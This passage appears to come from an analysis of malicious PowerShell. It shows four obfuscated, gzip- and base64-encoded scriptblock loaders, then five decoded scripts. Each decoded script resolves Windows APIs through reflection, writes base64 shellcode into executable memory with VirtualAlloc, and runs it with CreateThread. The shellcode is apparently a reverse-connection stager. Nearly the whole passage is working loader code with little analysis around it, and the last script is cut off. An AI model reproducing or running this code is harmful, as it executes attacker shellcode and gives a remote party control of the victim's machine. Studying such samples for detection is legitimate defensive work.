    [scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAKne010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEniDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2etYJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mIdlNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4VqB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcwYlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KYqglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiYSDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSqDvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo9925cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLafNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKShHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvxJCgAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())
    [scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIACHe010CA7VWbW/aSBD+nEj5D1aFZFshGANt2kiVbs07wQnEQCAUnTb22iysvWCvCabtf78x4DS9plV70ll5We/OzM4888yM3TiwBeWBhEsD6fPZ6UkPh9iXlBy13w3yUi5h60A9OYGDnN2VPkrKFK1WNe5jGsyurqpxGJJAHN4LTSJQFBH/kVESKar0Rbqfk5Bc3D4uiC2kz1Lu70KT8UfMjmJJFdtzIl2gwEnPutzGqS8Fa8WoUORPn2R1eqHPCvV1jFmkyFYSCeIXHMZkVfqqphcOkhVRZJPaIY+4Kwr3NCiXCsMgwi65AWsbYhIx504kqxAD/IRExGEgQTSp+uFQkWHZC7mNHCckUSTnpWlqeDqb/aVMj7fexYGgPim0A0FCvrJIuKE2iQotHDiM3BF3BlqWCGngzVQVxDZ8SZRcEDOWl/7EjHJDnjLMfldJeakEUj0RqnnI4g9RmtyJGTnoya+4uc+7Ck+We4Dt69np2ambEYWuX/IEVifT/ZqAa0qPR3Qv9VEq5iUTrsGChwm85gZhTNTZM7BSbuHkf66tZ6IguClh2JmOOHVmoHFMZM63rGa6/3NC1ohLA1JLAuxTO+Oc8hq+xGVkH14hE7sBnxT5eECcGmHEwyLFLE3zD2p1n4pnXSOmzCEhsiFHEXgF6VO/d+aQBkVuBybxAaDDO/Au5wLTSSZ9ZHeS3Z6+g5BcZTiK8lIvhlKz85JFMCNOXkJBRI9HKBZ8v5S/uWvGTFAbRyIzN1MzHI/3VXkQiTC2IWcQ+8BaEZtilkKRl1rUIUZiUS+7V34ViCpmDEoALG0gEbCTAmCJlAkhuAhZVwsWEW1/xYgPEvuKbzDsQX0fab4nDvaII//bv4zIB9amSGQQvPAO0msxLvLSiIYCGkeKKlDov9z9ol/svaiG5JgFJauLqZGIlM+5qDRItikfj5jsEQgFRN8IuW/giLyrHNqD8ka7pVUEz6QdMNM2llRHT1Rvm/A7pOU2r106151FSwtr27mL2lHbbPVq/VarsulYo4qw6m1x3WsLsz5eLCzUuhtOxEMbtQa0uJxUdqsO3Vld5Ey22rudsXsqGtvdwnPcSc11vUvXutPfNmj3vto3iiXcrdXj7r3xZBQrUZ0+tfp02F92GuJxMmJ46GreWP+A6bYbLkY6N3dthJrzsr3ruKPm3HSSSYuShVbs0j7qI3Rt3w2HTW/lNSOkfRitq/4CrRsYYdRG9VHSecuM/rBhoGHd6ONb3iuf1zT9wVnXGw9j3PGZ02xp+mSMHBRqA2+uX97OgxQn7BlrI5VB3YekoYFMr4JalRLdPaz7TQ/VQWbkc4QbdDk8H4PNmwHo3A91hyMRtMeaNvI0D7nWfIKRAdLGGjUMXk3e98yeNhqV5vrjUp+Dz2S8eW920HnD7mmadu4/wl8N2eZqG4yNp8uN17L4Nb7Go81DWdMHT00XrdH5uaEbj6JVL3c2cO9A+zD8+CYlEDAoZ/PhC1r8rJWbOIzmmAFdoEtnBdrgYePYd3ucphqKkg7qJQkDwmDQwSjMaI4Y43ba9KFBw7g5DIF0Jg1hWS69ulKlZ0H12zDItq6uHsBFqJs9tQtdEnhini9uy8UiNPfitlKEEH8/ripfJcrBVj6dDikwz8bZ3riaVlTONd/q1v8K2bGO5/DP+TVk3/Z+cfpbMBbz+4B/2P1+448Q/dOw7zEVIGhBD2LkMAFfi/7IjRdfB/uMQObd45N+293G4uIGvhrOTv8BxRZ9dEQKAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())
    [scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAE7e010CA7VWbW/aSBD+nEj9D1aFZFshGAeatJEq3Zo3m+AEYiAQik6LvTZL1jas1xDo9b/fGHCbqulde9JZeVnvzszOPPPMjP00cgWNI4nVqtLnN6cnXcxxKCmFTZo2ilIBG01PPTmBgwLD0kdJmaDlsh6HmEbT6+tayjmJxOG91CICJQkJZ4ySRFGlv6SHOeHk/G62IK6QPkuFP0stFs8wO4pta9idE+kcRV521oldnPlScpaMCkX+9ElWJ+f6tNRYpZgliuxsE0HCkseYrEpf1OzC/nZJFNmmLo+T2BelBxpVLkqDKME+uQVra2ITMY+9RFYhBvjhRKQ8kiCaTP1wqMiw7PLYRZ7HSZLIRWmSGZ5Mp38ok+Ot92kkaEhKViQIj5cO4WvqkqRk4shj5J74U9ByBKdRMFVVEFvHT0QpRCljRel3zCi3ZJNj9qtKykslkOoKrhYhiz9EacdeyshBT37FzX3eVXjy3ANsX96cvjn1c6JsguAlUWB1MtmvCfimdOOE7sU+SuWiZMM9WMR8C6+FPk+JOv2KrFTYRA/0svhzA3ouDbILGzYmw5h6U1A45rIwu8x2f87IOvFpROrbCIfUzUmnvAYw8RnZx1fKxW7BIUU+HhCvThgJsMhAy/L8g1ojpOKrrpFS5hGOXEhSAl5B/tTvnTnkQZGtyCYhAHR4B+IVfKA6yaWP9N7mt2fvICTXGE6SotRNodbcouQQzIhXlFCU0OMRSkW8X8rf3LVTJqiLE5Gbm6oHFI+31eIoETx1IWMQed9ZEpdilgFRlEzqEWPr0CC/VX4VhhpmDCoALK0hDbCThe+IjAccHDzkXC05RFjhkpEQhPY132Q4gAo/En3PHBwQT/7ewZzIB9ZmQOQIvHAPsuuwWBSlIeUCGkcG6sL+j3e/6BjgRY2TYxKUvC4mxlZkdC4wvrYyNh4x2SPABUTf5HFo4IRcVg/dQXmr3dEagmdsRcx2jSeqow3VLRt+B7RixfUr76a9MDVef577yEos2+zWe6ZZXbedYVU4DUvcdC1hN0aLhYPM+8FYPFrI7NPy07i6W7bpzukgb/ysXe6M3aZsPO8WgeeP674fXPnOvf6uSTsPtZ5RvsCdeiPtPBgbo1xNGnRj9uig99Ruitl4yPDA14KR/gHT5w5fDPXY3lkIteYVd9f2h6257W3HJiULrdyhPdRD6Ma9HwxawTJoJUj7MFzVwgVaNTHCyEKN4bb9jhm9QdNAg4bRw3dxt3JW1/RHb9VoPo5wO2Rey9T08Qh5iGv9YK5f3c2jDCccGCsjk0Gdx21TA5luFZnVC7p7XPVaAWqAzDCMEW7Sp8HZCGze9kHnYaB7MRKRNdK0YaAFyHfmY4wMkDZWqGnEte37rt3VhsOLuT570ufgMxmt39ttdNZ0u5qmnYUz+Ksh114+RyNjc7UOTCe+wTd4uH6saHp/0/LRCp2dGboxE2aj0l7DvX3tw+Dj24w9QJ/C4paIF7z4WSu3MU/mmAFfoEvn9dmMefPYd7sxzTQUJRvUT4RHhMGgg1GY0xwxFrtZ088aNMybwxTIhtIAlpWLV1eq9FVQ/TYN8q3r60fwESon43apQ6JAzIvl50q5DL29/FwtQ4y/HlctXm6VvaliNhv2wOS22d62mhVUAXuJ2f1fETuW8Rz+ef+C2Le9fzj9JRTLxUPEP2x/v/FbkP5u4A+YChB0oAsxcpiAr8Z/JMeL74N9UiD3/vHJvu7uUnF+C98Nb07/BljTPkRGCgAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())
    [scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAKne010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEniDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2etYJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mIdlNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4VqB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcwYlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KYqglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiYSDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSqDvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo9925cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLafNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKShHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvxJCgAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())
    ```
    and the following results:
    1:
    ```powershell
    function a2T {
        Param ($ic6T, $ylqn)		
        $cL = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        return $cL.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($cL.GetMethod('GetModuleHandle')).Invoke($null, @($ic6T)))), $ylqn))
    }

    function iq {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jd,
            [Parameter(Position = 1)] [Type] $v2a = [Void]
        )
        
        $mSSG = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $mSSG.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $jd).SetImplementationFlags('Runtime, Managed')
        $mSSG.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $v2a, $jd).SetImplementationFlags('Runtime, Managed')
        
        return $mSSG.CreateType()
    }

    [Byte[]]$s2Tyx = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
            
    $coU = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((a2T kernel32.dll VirtualAlloc), (iq @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $s2Tyx.Length,0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($s2Tyx, 0, $coU, $s2Tyx.length)

    $fM51S = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((a2T kernel32.dll CreateThread), (iq @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$coU,[IntPtr]::Zero,0,[IntPtr]::Zero)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((a2T kernel32.dll WaitForSingleObject), (iq @([IntPtr], [Int32]))).Invoke($fM51S,0xffffffff) | Out-Null
    ```
    2:
    ```powershell
    function lC4 {
        Param ($wuuE, $aBFd)		
        $la = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        return $la.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($la.GetMethod('GetModuleHandle')).Invoke($null, @($wuuE)))), $aBFd))
    }

    function wgg {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $wnWi6,
            [Parameter(Position = 1)] [Type] $jM = [Void]
        )
        
        $b6 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $b6.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $wnWi6).SetImplementationFlags('Runtime, Managed')
        $b6.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $jM, $wnWi6).SetImplementationFlags('Runtime, Managed')
        
        return $b6.CreateType()
    }

    [Byte[]]$lrvI = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
            
    $jNet = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lC4 kernel32.dll VirtualAlloc), (wgg @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $lrvI.Length,0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($lrvI, 0, $jNet, $lrvI.length)

    $adsHP = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lC4 kernel32.dll CreateThread), (wgg @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$jNet,[IntPtr]::Zero,0,[IntPtr]::Zero)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lC4 kernel32.dll WaitForSingleObject), (wgg @([IntPtr], [Int32]))).Invoke($adsHP,0xffffffff) | Out-Null

    ```
    3:
    ```powershell
    function uM1F {
        Param ($i46, $zVytt)		
        $vwxWO = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        return $vwxWO.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($vwxWO.GetMethod('GetModuleHandle')).Invoke($null, @($i46)))), $zVytt))
    }

    function nL9 {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $kESi,
            [Parameter(Position = 1)] [Type] $mVd_U = [Void]
        )
        
        $yv = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $yv.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $kESi).SetImplementationFlags('Runtime, Managed')
        $yv.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $mVd_U, $kESi).SetImplementationFlags('Runtime, Managed')
        
        return $yv.CreateType()
    }

    [Byte[]]$dc = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
            
    $oDm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll VirtualAlloc), (nL9 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dc.Length,0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($dc, 0, $oDm, $dc.length)

    $lHZX = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll CreateThread), (nL9 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$oDm,[IntPtr]::Zero,0,[IntPtr]::Zero)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll WaitForSingleObject), (nL9 @([IntPtr], [Int32]))).Invoke($lHZX,0xffffffff) | Out-Null
    ```
    4:
    ```powershell
    function a2T {
        Param ($ic6T, $ylqn)		
        $cL = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        return $cL.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($cL.GetMethod('GetModuleHandle')).Invoke($null, @($ic6T)))), $ylqn))
    }

    function iq {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jd,
            [Parameter(Position = 1)] [Type] $v2a = [Void]
        )
        
        $mSSG = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $mSSG.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $jd).SetImplementationFlags('Runtime, Managed')
        $mSSG.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $v2a, $jd).SetImplementationFlags('Runtime, Managed')
        
        return $mSSG.CreateType()
    }

    [Byte[]]$s2Tyx = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
            
    $coU = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((a2T kernel32.dll VirtualAlloc), (iq @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $s2Tyx.Length,0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($s2Tyx, 0, $coU, $s2Tyx.length)

    $fM51S = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((a2T kernel32.dll CreateThread), (iq @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$coU,[IntPtr]::Zero,0,[IntPtr]::Zero)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((a2T kernel32.dll WaitForSingleObject), (iq @([IntPtr], [Int32]))).Invoke($fM51S,0xffffffff) | Out-Null
    ```
    5:
    ```powershell
    function lC4 {
        Param ($wuuE, $aBFd)		
        $la = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        return $la.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($la.GetMethod('GetModuleHandle')).Invoke($null, @($wuuE)))), $aBFd))
    }

    function wgg {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $wnWi6,
            [Parameter(Position = 1)] [Type] $jM = [Void]
        )
        
        $b6 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $b6.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $wnWi6).SetImplementationFlags('Runtime, Managed')
        $b6.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $jM, $wnWi6).SetImplementationFlags('Runtime, Managed')
        
        return $b6.CreateType()
    }

